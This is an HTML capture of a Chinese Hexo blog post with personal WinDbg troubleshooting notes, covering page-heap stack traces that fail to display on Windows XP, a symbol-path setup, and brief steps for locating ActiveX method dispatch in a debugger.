+        <h2 id="无法正确输出地址问题"><a href="#无法正确输出地址问题" class="headerlink" title="无法正确输出地址问题"></a>无法正确输出地址问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadMemory error for address eeddccee</span><br><span class="line">Use `!address eeddccee&apos; to check validity of the address.</span><br></pre></td></tr></table></figure>
+<h1 id="无法正确断下点问题"><a href="#无法正确断下点问题" class="headerlink" title="无法正确断下点问题"></a>无法正确断下点问题</h1><pre><code>address命令正确的指示了该地址为私有堆内存，但该内存页不可访问。
+检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options，确定已经正确的设置了，
+尝试其他多种设置，甚至换工具进行设置，但结依然如此。
+难道是机器问题？于是在win732位机器上重复上述过程，
+发现是可以正确的打印出堆内存指针被释放的栈回溯的。
+但更换其他xp机器依然不能正确显示。
+&quot;CTEST* pCTest = new CTEST(); &quot;的栈回溯几率，
+即申请堆内存的记录，但始终未找到释放堆内存的记录。
+于是再次怀疑xp下的页堆并没有真正启动或启动是有问题的，
+于是检查下页堆启动情况：
+“ReadMemory error for address eeddccee”，  
+且只展示一个Page Heap句柄了，剩下的未展示完全，
+但页堆明明白白的现实已经开启，也有了准页堆，
+但数据却显示不出来，说明数据可能被破坏，
+但测试代码如此简单，而且也被windbg第一时间断下，
+不可能去破坏数据，换成6.6.0007.5版即可解决。
+试了下果然在xp下顺利输出了用户态栈回溯。
+Win7下的 _STACK_TRACE_DATABASE 结构和xp下并不完全相同，
+关键的 Buckets（栈回溯记录）的结构偏移改了，
+而且原xp下是个数组，但win7下却变成了链表，
+故猜测高版本的Windbg在xp下依然使用了win7下的某些数据结构，
+从而导致Windbg解析出了问题。
+</code></pre><h2 id="无法正确下堆断点"><a href="#无法正确下堆断点" class="headerlink" title="无法正确下堆断点"></a>无法正确下堆断点</h2><pre><code>peb错误
+输入如下代码
+就可以！gflag
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath srv*C:\symblol*http://msdl.microsoft.com/download/symbols </span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>
+<h2 id="active控件分析方法"><a href="#active控件分析方法" class="headerlink" title="active控件分析方法"></a>active控件分析方法</h2><pre><code>alt+e进入oleaut32
+ctrl+n 找到DISPCALLFUNC
+找到首个 call ecx
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+
+<nav id="pagination">
+  
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
+
+</nav>
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/07/07/sulb/">slub</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/afl/">afl</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/brop/">brop</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/hexo/">搭建博客</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 another
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
